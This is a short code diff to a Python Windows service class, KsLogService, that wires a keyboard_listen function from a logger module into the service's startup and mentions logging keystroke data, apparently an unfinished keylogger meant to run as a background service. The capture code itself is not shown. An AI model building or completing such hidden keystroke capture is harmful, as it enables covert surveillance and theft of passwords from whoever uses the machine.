@@ -7,6 +7,7 @@ import win32service
 import socket
 import servicemanager
 
+from logger import keyboard_listen
 class KsLogService(win32serviceutil.ServiceFramework):
     """base class to create a windows service python"""
     
@@ -48,6 +49,7 @@ class KsLogService(win32serviceutil.ServiceFramework):
         Override to add logic before the start
         eg. running condition
         '''
+        keyboard_listen()
         print('hello')
         pass
     
@@ -56,9 +58,9 @@ class KsLogService(win32serviceutil.ServiceFramework):
         Override to add logic before the start
         eg. running condition
         '''
-        pass
+    
     def main(self):
-        #this might be where we start logging keystroke data
+        #need  to  figure out how to stop the process
         pass
     
 if __name__ == '__main__':
